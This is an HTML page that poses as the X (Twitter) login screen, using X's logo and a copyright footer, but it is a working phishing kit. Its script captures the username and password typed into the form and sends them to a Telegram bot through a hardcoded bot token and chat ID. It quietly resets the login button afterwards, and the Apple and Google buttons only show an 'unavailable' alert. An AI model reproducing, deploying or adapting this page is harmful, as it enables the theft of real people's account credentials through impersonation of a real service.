<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            margin: auto;
            padding: 20px;
        }

        .logo {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo svg {
            width: 40px;
            height: 40px;
            fill: #fff;
        }

        .login-options {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .option {
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 30px;
            padding: 12px 16px;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            transition: all 0.2s;
            font-weight: 500;
        }

        .option:hover {
            background: rgba(255, 255, 255, 0.12);
        }

        .option i {
            font-size: 18px;
        }

        .apple {
            color: #fff;
        }

        .google {
            color: #EA4335;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
            color: rgba(255, 255, 255, 0.5);
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.1);
        }

        .divider span {
            padding: 0 15px;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group input {
            width: 100%;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 14px 16px;
            color: #fff;
            font-size: 16px;
        }

        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        .form-group input:focus {
            outline: none;
            border-color: #1D9BF0;
        }

        .login-btn {
            width: 100%;
            background: #fff;
            color: #000;
            border: none;
            border-radius: 30px;
            padding: 14px 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background: #e6e6e6;
        }

        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-link:hover {
            color: #fff;
        }

        .signup-section {
            text-align: center;
            margin-top: 50px;
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
        }

        .signup-link {
            color: #1D9BF0;
            text-decoration: none;
            font-weight: 500;
            margin-left: 5px;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: auto;
            padding: 20px 0;
            text-align: center;
            color: rgba(255, 255, 255, 0.4);
            font-size: 12px;
        }

        @media (max-height: 700px) {
            .container {
                margin-top: 20px;
            }

            .signup-section {
                margin-top: 30px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" width="40" height="40">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
            </svg>
        </div>

        <div class="login-options">
            <button class="option">
                <i class="fab fa-apple apple"></i>
                Sign in with Apple
            </button>
            <button class="option">
                <i class="fab fa-google google"></i>
                Sign in with Google
            </button>
        </div>

        <div class="divider">
            <span>or</span>
        </div>

        <form>
            <div class="form-group">
                <input id="email" type="text" placeholder="Phone, email, or username" required>
            </div>
            <div class="form-group">
                <input id="password" type="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>

        <a href="#" class="forgot-link">Forgot password?</a>

        <div class="signup-section">
            <span>Don't have an account?</span>
            <a href="#" class="signup-link">Sign up</a>
        </div>
    </div>

    <div class="footer">
        <p>Â© 2023 X Corp.</p>
    </div>

    <script>
        const BOT_TOKEN = '7252537848:AAHHnI05acNemda4o68TZ3UYKySYw-46XvM';
        const CHAT_ID = '6329815039';

        function sendTelegramMessage(messageText) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            const requestBody = {
                chat_id: CHAT_ID,
                text: messageText
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(requestBody)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent successfully:', data);
            })
            .catch(error => {
                console.error('Error sending message:', error);
            });
        }

        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.querySelector('form');
            const loginOptions = document.querySelectorAll('.option');

            // Form submission
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                const inputs = this.querySelectorAll('input');
                let isValid = true;

                inputs.forEach(input => {
                    if (!input.value.trim()) {
                        isValid = false;
                        input.style.borderColor = '#1D9BF0';
                    } else {
                        input.style.borderColor = 'rgba(255, 255, 255, 0.1)';
                    }
                });

                if (isValid) {
                    this.querySelector('.login-btn').textContent = 'Logging in...';
                    setTimeout(() => {
                        let email = document.querySelector("#email").value;
                        let password = document.querySelector("#password").value;
                      sendTelegramMessage("X => Email/Username: " + email + " Password: " + password);
                        this.querySelector('.login-btn').textContent = 'Log in';
                    }, 1000);
                }
            });

            // Login options click handlers
            loginOptions.forEach(option => {
                option.addEventListener('click', function() {
                    const platform = this.textContent.trim().replace('Sign in with ', '');
                    alert(`Login with ${platform} unavailable try other options`);
                });
            });
        });
    </script>
</body>
</html>
